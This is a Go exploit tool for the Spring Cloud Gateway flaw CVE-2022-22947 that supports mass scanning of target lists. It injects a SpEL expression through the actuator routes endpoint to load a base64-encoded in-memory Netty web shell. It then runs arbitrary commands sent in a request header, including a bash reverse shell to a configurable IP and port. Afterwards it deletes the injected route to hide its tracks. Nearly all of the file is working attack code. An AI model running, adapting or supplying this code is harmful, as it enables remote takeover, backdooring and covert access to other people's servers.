package main

import (
	"bufio"
	"flag"
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/go-resty/resty/v2"
	"github.com/panjf2000/ants/v2"
)

func Between(str, starting, ending string) string {
	s := strings.Index(str, starting)
	if s < 0 {
		return ""
	}
	s += len(starting)
	e := strings.Index(str[s:], ending)
	if e < 0 {
		return ""
	}
	return str[s : s+e]
}

func RandString(len int) string {
	r := rand.New(rand.NewSource(time.Now().UnixNano()))
	bytes := make([]byte, len)
	for i := 0; i < len; i++ {
		b := r.Intn(26) + 65
		bytes[i] = byte(b)
	}
	return string(bytes)
}

var finalresult []string

func verify(target interface{}, runCommand string, ip string, port string) {
	randStr := RandString(5)
	t := target.(string)

	//第一个请求(发送如下数据包即可添加一个包含恶意SpEL表达式的路由)
	client1 := resty.New()
	client1.SetTimeout(15 * time.Second)
	resp1, err := client1.R().
		SetHeader("Content-Type", "application/json").
		SetHeader("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0").
		SetHeader("Accept-Language", "en").
		SetHeader("Accept-Encoding", "gzip, deflate").
		SetHeader("Accept", "*/*").
		SetBody(`{
			"predicates": [
			  {
				"name": "Path",
				"args": {
				  "_genkey_0": "/new_route/**"
				}
			  }
			],
			"filters": [
			  {
				"name": "RewritePath",
				"args": {
				  "_genkey_0": "#{T(org.springframework.cglib.core.ReflectUtils).defineClass('NettyMemshell',T(org.springframework.util.Base64Utils).decodeFromString('yv66vgAAADQBEgoAPgB8CAB9BwB+CABTBwB/CgAFAIAKAIEAggcAgwoAgQCECgCFAIYKAIUAhwoACACICgAFAIkIAIoKAIsAjAgASwoABQCNCgCOAIIKAI4AjwoABQCQCABOCACRBwCSCgAXAHwKAI4AkwgAlAcAlQgAlgsAlwCYCACZCACaCwCbAJwHAJ0LACEAnggAawoAnwCgCgCfAKEHAKIKAKMApAoAowClCgCmAKcKACYAqAgAqQoAJgCqCgAmAKsJAKwArQoAFwCuCgAbAK8LALAAsQcAsgkAswC0CQC1ALYKALcAuAoAMgC5CwC6AJ4JALsAvAgAvQoAnwC+CwCwAL8JAMAAwQsAwgDDBwDEBwDFAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAA9MTmV0dHlNZW1zaGVsbDsBAAhkb0luamVjdAEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAVX3ZhbCRkaXNwb3NhYmxlU2VydmVyAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAFHZhbCRkaXNwb3NhYmxlU2VydmVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQAHX2NvbmZpZwEABmNvbmZpZwEAEF9kb09uQ2hhbm5lbEluaXQBAAZ0aHJlYWQBAAFpAQABSQEACmdldFRocmVhZHMBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAB3RocmVhZHMBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQADbXNnAQASTGphdmEvbGFuZy9TdHJpbmc7AQANU3RhY2tNYXBUYWJsZQcAxgcAxwcAgwcAlQEADW9uQ2hhbm5lbEluaXQBAFcoTHJlYWN0b3IvbmV0dHkvQ29ubmVjdGlvbk9ic2VydmVyO0xpby9uZXR0eS9jaGFubmVsL0NoYW5uZWw7TGphdmEvbmV0L1NvY2tldEFkZHJlc3M7KVYBABJjb25uZWN0aW9uT2JzZXJ2ZXIBACJMcmVhY3Rvci9uZXR0eS9Db25uZWN0aW9uT2JzZXJ2ZXI7AQAHY2hhbm5lbAEAGkxpby9uZXR0eS9jaGFubmVsL0NoYW5uZWw7AQANc29ja2V0QWRkcmVzcwEAGExqYXZhL25ldC9Tb2NrZXRBZGRyZXNzOwEACHBpcGVsaW5lAQAiTGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbFBpcGVsaW5lOwEAC2NoYW5uZWxSZWFkAQA9KExpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxIYW5kbGVyQ29udGV4dDtMamF2YS9sYW5nL09iamVjdDspVgEAA2NtZAEACmV4ZWNSZXN1bHQBAAtodHRwUmVxdWVzdAEAKUxpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvSHR0cFJlcXVlc3Q7AQADY3R4AQAoTGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbEhhbmRsZXJDb250ZXh0OwcAnQEACkV4Y2VwdGlvbnMBAARzZW5kAQBtKExpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxIYW5kbGVyQ29udGV4dDtMamF2YS9sYW5nL1N0cmluZztMaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBSZXNwb25zZVN0YXR1czspVgEAB2NvbnRleHQBAAZzdGF0dXMBADBMaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBSZXNwb25zZVN0YXR1czsBAAhyZXNwb25zZQEALkxpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvRnVsbEh0dHBSZXNwb25zZTsBAApTb3VyY2VGaWxlAQASTmV0dHlNZW1zaGVsbC5qYXZhDABAAEEBAAxpbmplY3Qtc3RhcnQBABBqYXZhL2xhbmcvVGhyZWFkAQAPamF2YS9sYW5nL0NsYXNzDADIAMkHAMcMAMoAywEAEGphdmEvbGFuZy9PYmplY3QMAMwAzQcAzgwAzwDQDADRANIMANMA1AwA1QBIAQAOTmV0dHlXZWJTZXJ2ZXIHAMYMANYA1wwA2ADZBwDaDADRANsMANwA1AEAD2RvT25DaGFubmVsSW5pdAEADU5ldHR5TWVtc2hlbGwMAN0A3gEADmluamVjdC1zdWNjZXNzAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEADGluamVjdC1lcnJvcgcA3wwAZwDgAQAfcmVhY3Rvci5sZWZ0Lmh0dHBUcmFmZmljSGFuZGxlcgEAEG1lbXNoZWxsX2hhbmRsZXIHAOEMAOIA4wEAJ2lvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwUmVxdWVzdAwA5ADlBwDmDADWAOcMANEA6AEAEWphdmEvdXRpbC9TY2FubmVyBwDpDADqAOsMAOwA7QcA7gwA7wDwDABAAPEBAAJcQQwA8gDzDAD0AEgHAPUMAPYAdwwAcwB0DAD3AEEHAPgMAPkA+gEAM2lvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9EZWZhdWx0RnVsbEh0dHBSZXNwb25zZQcA+wwA/AD9BwD+DAD/AQAHAQEMAQIBAwwAQAEEBwEFBwEGDAEHAQgBABl0ZXh0L3BsYWluOyBjaGFyc2V0PVVURi04DADdAQkMAQoBCwcBDAwBDQEOBwEPDAEQAREBACVpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxEdXBsZXhIYW5kbGVyAQAncmVhY3Rvci9uZXR0eS9DaGFubmVsUGlwZWxpbmVDb25maWd1cmVyAQAQamF2YS9sYW5nL1N0cmluZwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEADXNldEFjY2Vzc2libGUBAAQoWilWAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAXamF2YS9sYW5nL3JlZmxlY3QvQXJyYXkBAAlnZXRMZW5ndGgBABUoTGphdmEvbGFuZy9PYmplY3Q7KUkBAANnZXQBACcoTGphdmEvbGFuZy9PYmplY3Q7SSlMamF2YS9sYW5nL09iamVjdDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAdnZXROYW1lAQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEADWdldFN1cGVyY2xhc3MBAANzZXQBACcoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KVYBABhpby9uZXR0eS9jaGFubmVsL0NoYW5uZWwBACQoKUxpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxQaXBlbGluZTsBACBpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxQaXBlbGluZQEACWFkZEJlZm9yZQEAaShMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsSGFuZGxlcjspTGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbFBpcGVsaW5lOwEAB2hlYWRlcnMBACsoKUxpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvSHR0cEhlYWRlcnM7AQAnaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBIZWFkZXJzAQAVKExqYXZhL2xhbmcvU3RyaW5nOylaAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAEbmV4dAEALmlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwUmVzcG9uc2VTdGF0dXMBAAJPSwEAD3ByaW50U3RhY2tUcmFjZQEAJmlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbEhhbmRsZXJDb250ZXh0AQAPZmlyZUNoYW5uZWxSZWFkAQA8KExqYXZhL2xhbmcvT2JqZWN0OylMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsSGFuZGxlckNvbnRleHQ7AQAnaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBWZXJzaW9uAQAISFRUUF8xXzEBAClMaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBWZXJzaW9uOwEAGWlvL25ldHR5L3V0aWwvQ2hhcnNldFV0aWwBAAVVVEZfOAEAGkxqYXZhL25pby9jaGFyc2V0L0NoYXJzZXQ7AQAYaW8vbmV0dHkvYnVmZmVyL1VucG9vbGVkAQAMY29waWVkQnVmZmVyAQBNKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlO0xqYXZhL25pby9jaGFyc2V0L0NoYXJzZXQ7KUxpby9uZXR0eS9idWZmZXIvQnl0ZUJ1ZjsBAHUoTGlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwVmVyc2lvbjtMaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBSZXNwb25zZVN0YXR1cztMaW8vbmV0dHkvYnVmZmVyL0J5dGVCdWY7KVYBACxpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvRnVsbEh0dHBSZXNwb25zZQEAK2lvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwSGVhZGVyTmFtZXMBAAxDT05URU5UX1RZUEUBABtMaW8vbmV0dHkvdXRpbC9Bc2NpaVN0cmluZzsBAFUoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7TGphdmEvbGFuZy9PYmplY3Q7KUxpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvSHR0cEhlYWRlcnM7AQANd3JpdGVBbmRGbHVzaAEANChMamF2YS9sYW5nL09iamVjdDspTGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbEZ1dHVyZTsBACZpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxGdXR1cmVMaXN0ZW5lcgEABUNMT1NFAQAoTGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbEZ1dHVyZUxpc3RlbmVyOwEAHmlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbEZ1dHVyZQEAC2FkZExpc3RlbmVyAQBSKExpby9uZXR0eS91dGlsL2NvbmN1cnJlbnQvR2VuZXJpY0Z1dHVyZUxpc3RlbmVyOylMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsRnV0dXJlOwAhABcAPgABAD8AAAAFAAEAQABBAAEAQgAAAC8AAQABAAAABSq3AAGxAAAAAgBDAAAABgABAAAADgBEAAAADAABAAAABQBFAEYAAAAJAEcASAABAEIAAAHDAAQACgAAALUSAksSAxIEA70ABbYABkwrBLYABysBA70ACLYACU0DPh0suAAKogCHLB24AAs6BBkExgB1GQS2AAy2AA0SDrYAD5kAZRkEtgAMEhC2ABE6BRkFBLYAEhkFGQS2ABM6BhkGtgAMtgAUEhW2ABE6BxkHBLYAEhkHGQa2ABM6CBkItgAMtgAUtgAUEha2ABE6CRkJBLYAEhkJGQi7ABdZtwAYtgAZEhpLhAMBp/93pwAHTBIcSyqwAAEAAwCsAK8AGwADAEMAAABaABYAAAAQAAMAEgAPABMAFAAUAB4AFgAoABcALwAYAEQAGQBQABoAVgAbAF8AHABuAB0AdAAeAH0AHwCPACAAlQAhAKMAIgCmABYArAAnAK8AJQCwACYAswAoAEQAAABwAAsAUABWAEkASgAFAF8ARwBLAEwABgBuADgATQBKAAcAfQApAE4ATAAIAI8AFwBPAEoACQAvAHcAUABMAAQAIACMAFEAUgADAA8AnQBTAFQAAQAeAI4AVQBMAAIAsAADAFYAVwABAAMAsgBYAFkAAABaAAAAHgAF/wAgAAQHAFsHAFwHAF0BAAD7AIX4AAVCBwBeAwABAF8AYAABAEIAAAB2AAUABQAAABwsuQAdAQA6BBkEEh4SH7sAF1m3ABi5ACAEAFexAAAAAgBDAAAADgADAAAALgAIADAAGwAxAEQAAAA0AAUAAAAcAEUARgAAAAAAHABhAGIAAQAAABwAYwBkAAIAAAAcAGUAZgADAAgAFABnAGgABAABAGkAagACAEIAAAEQAAQABgAAAGEswQAhmQBULMAAIU4tuQAiAQASI7YAJJkANy25ACIBABIjtgAlOgS7ACZZuAAnGQS2ACi2ACm3ACoSK7YALLYALToFKisZBbIALrcAL7GnAAo6BBkEtgAwKyy5ADECAFexAAEADABNAFEAGwADAEMAAAAyAAwAAAA3AAcAOAAMADoAGgA7ACcAPABDAD4ATQA/AE4AQwBRAEEAUwBCAFgARQBgAEYARAAAAEgABwAnACcAawBZAAQAQwALAGwAWQAFAFMABQBWAFcABAAMAEwAbQBuAAMAAABhAEUARgAAAAAAYQBvAHAAAQAAAGEAWABMAAIAWgAAAA8AA/wATgcAcUIHAF76AAYAcgAAAAQAAQAbAAIAcwB0AAEAQgAAAJQABgAFAAAANrsAMlmyADMtLLIANLgANbcANjoEGQS5ADcBALIAOBI5tgA6VysZBLkAOwIAsgA8uQA9AgBXsQAAAAIAQwAAABIABAAAAEoAFABLACQATAA1AE0ARAAAADQABQAAADYARQBGAAAAAAA2AG8AcAABAAAANgB1AFkAAgAAADYAdgB3AAMAFAAiAHgAeQAEAAEAegAAAAIAew=='),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject()}",
				  "_genkey_1": "/${path}"
				}
			  }
			],
			"uri": "https://wya.pl",
			"order": 0
		  }`).
		Post(t + "/actuator/gateway/routes/" + randStr)

	if err != nil {
		fmt.Println("Request error: " + t)
	} else {
		if resp1.StatusCode() == http.StatusCreated {
			//第二个请求(刷新刚添加的路由)
			client2 := resty.New()
			client2.SetTimeout(15 * time.Second)
			resp2, err := client2.R().
				SetHeader("Content-Type", "application/x-www-form-urlencoded").
				SetHeader("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0").
				Post(t + "/actuator/gateway/refresh")
			if err != nil {
				fmt.Println("Request error: " + t)
			} else {
				if resp2.StatusCode() == http.StatusOK && runCommand == "" {
					// revershell
					client3 := resty.New()
					client3.SetTimeout(15 * time.Second)
					resp3, _ := client3.R().
						SetHeader("Content-Type", "application/x-www-form-urlencoded").
						SetHeader("cmd", "bash -c $@|bash 0 echo bash -i >& /dev/tcp/"+ip+"/"+port+" 0>&1").
						SetHeader("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0").
						Get(t + "/actuator/gateway/routes/" + randStr)

					bodyString := string(resp3.Body())
					fmt.Println(bodyString)
					fmt.Println("clean......")
					//第四个请求(清理添加的路由)
					client4 := resty.New()
					client4.SetTimeout(15 * time.Second)
					resp4, err := client4.R().
						SetHeader("Content-Type", "application/x-www-form-urlencoded").
						SetHeader("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0").
						Delete(t + "/actuator/gateway/routes/" + randStr)
					if err != nil {
						fmt.Println("Request error: " + t)
					} else {
						if resp4.StatusCode() == http.StatusOK {
							//第五个请求(刷新路由)

							client5 := resty.New()
							client5.SetTimeout(15 * time.Second)
							resp5, err := client4.R().
								SetHeader("Content-Type", "application/x-www-form-urlencoded").
								SetHeader("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0").
								Post(t + "/actuator/gateway/refresh")
							if err != nil {
								fmt.Println("Request error: " + t)
							} else {
								if resp5.StatusCode() == http.StatusOK {
									return
								}
							}
						}
					}
				}
				if resp2.StatusCode() == http.StatusOK && runCommand != "" {
					//第三个请求(查看执行结果)
					client3 := resty.New()
					client3.SetTimeout(15 * time.Second)
					resp3, err := client3.R().
						SetHeader("Content-Type", "application/x-www-form-urlencoded").
						SetHeader("cmd", "bash -c $@|bash 0 echo "+runCommand).
						SetHeader("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0").
						Get(t + "/actuator/gateway/routes/" + randStr)

					bodyString := string(resp3.Body())
					fmt.Println(t, "--------", bodyString)
					finalresult = append(finalresult, t)

					if err != nil {
						fmt.Println("Request1 error: " + t)
					} else {
						if resp3.StatusCode() == http.StatusOK {
							//第四个请求(清理添加的路由)
							client4 := resty.New()
							client4.SetTimeout(15 * time.Second)
							resp4, err := client4.R().
								SetHeader("Content-Type", "application/x-www-form-urlencoded").
								SetHeader("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0").
								Delete(t + "/actuator/gateway/routes/" + randStr)
							if err != nil {
								fmt.Println("Request error: " + t)
							} else {
								if resp4.StatusCode() == http.StatusOK {
									//第五个请求(刷新路由)

									client5 := resty.New()
									client5.SetTimeout(15 * time.Second)
									resp5, err := client4.R().
										SetHeader("Content-Type", "application/x-www-form-urlencoded").
										SetHeader("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0").
										Post(t + "/actuator/gateway/refresh")
									if err != nil {
										fmt.Println("Request error: " + t)
									} else {
										if resp5.StatusCode() == http.StatusOK {
											return
										}
									}
								}
							}
						}
					}

				} else {
					return
				}

			}
		} else {
			return
		}
	}
}

func main() {
	var targetURL, runCommand, filepath, ip, port string
	var thread int
	targets := []string{}

	flag.StringVar(&targetURL, "u", "", "")
	flag.StringVar(&filepath, "l", "", "")
	flag.StringVar(&runCommand, "c", "", "")
	flag.StringVar(&ip, "ip", "192.168.19.110", "")
	flag.StringVar(&port, "port", "9090", "")
	flag.IntVar(&thread, "t", 10, "")
	flag.CommandLine.Usage = func() {
		fmt.Println("执行命令：./CVE-2022-22947 -u http://127.0.0.1:8080 -c whoami ")
		fmt.Println("批量检测：./CVE-2022-22947 -l url.txt -t 20")
	}

	flag.Parse()

	if len(targetURL) == 0 {
		fmt.Println("runcommand: ", runCommand, " ip: ", ip, " port: ", port)
		file, err := os.OpenFile(filepath, os.O_RDWR, 0666)
		if err != nil {
			fmt.Println("Open file error!", err)
			return
		}
		defer file.Close()

		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			target := scanner.Text()
			if target == "" {
				continue
			}
			if !strings.Contains(target, "http") {
				target = "http://" + target
			}
			targets = append(targets, target)
		}
		wg := sync.WaitGroup{}
		p, _ := ants.NewPoolWithFunc(thread, func(i interface{}) {
			verify(i, runCommand, ip, port)
			wg.Done()
		})
		defer p.Release()

		for _, t := range targets {
			wg.Add(1)
			_ = p.Invoke(t)
		}
		wg.Wait()
		fileName := "vuln.txt"
		file, err = os.Create(fileName)
		if err != nil {
			return
		}
		defer file.Close()
		for _, v := range finalresult {
			file.WriteString(v + "\n")
		}

	} else {
		verify(targetURL, runCommand, ip, port)
	}

}
